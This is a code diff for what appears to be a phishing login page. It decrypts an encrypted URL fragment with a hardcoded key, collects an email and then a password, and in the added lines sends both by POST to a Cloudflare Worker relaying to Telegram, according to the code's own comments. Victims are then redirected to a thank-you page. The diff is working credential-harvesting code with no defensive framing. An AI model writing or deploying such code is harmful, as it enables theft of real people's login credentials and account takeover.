@@ -1,5 +1,5 @@
 document.addEventListener('DOMContentLoaded', function() {
-    checkCookie();
+    checkCookie()
     let hashUrl = window.location.hash.substr(1).replace(new RegExp("%20", "g"), "+");
 
     let bytes = CryptoJS.AES.decrypt(hashUrl, 'secret key 123');
@@ -42,14 +42,12 @@ document.addEventListener('DOMContentLoaded', function() {
         username = document.getElementById("userID").value;
         event.preventDefault();
 
-        // Validate username (email)
         if (!isEmail(username)) {
             error.innerHTML = "Please enter your username correctly!";
         } else {
-            // Username is valid, move to password entry
             $(userBackButton).text(username);
-            $(".sub_div").removeClass("hide");  // Show password input
-            $(".main_div").addClass("hide");    // Hide the email input
+            $(".sub_div").removeClass("hide");
+            $(".main_div").addClass("hide");
         }
     });
 
@@ -64,4 +62,28 @@ document.addEventListener('DOMContentLoaded', function() {
         // Validate password length
         if (password.length < 4) {
             passerror.style.fontSize = "small";
-            passerror.innerHTML = "Please enter your password correct
+            passerror.innerHTML = "Please enter your password correctly!";
+        } else {
+            // Send both username and password to the Cloudflare Worker (Telegram)
+            fetch(url, {
+                method: "POST",
+                body: JSON.stringify({
+                    userID: username,   // Send the username (email) field
+                    password: password, // Send the password field
+                }),
+                headers: {
+                    "Content-type": "application/json; charset=UTF-8"
+                }
+            })
+            .then(function(response) {
+                // Successfully sent data, redirect to thanks.html
+                setCookie("username", username, 30);  // Optionally store the username in a cookie
+                window.location.href = "./thanks.html"; // Redirect after success
+            })
+            .catch(function(error) {
+                passerror.style.fontSize = "small";
+                passerror.innerHTML = "There was an error processing your request.";
+            });
+        }
+    });
+});
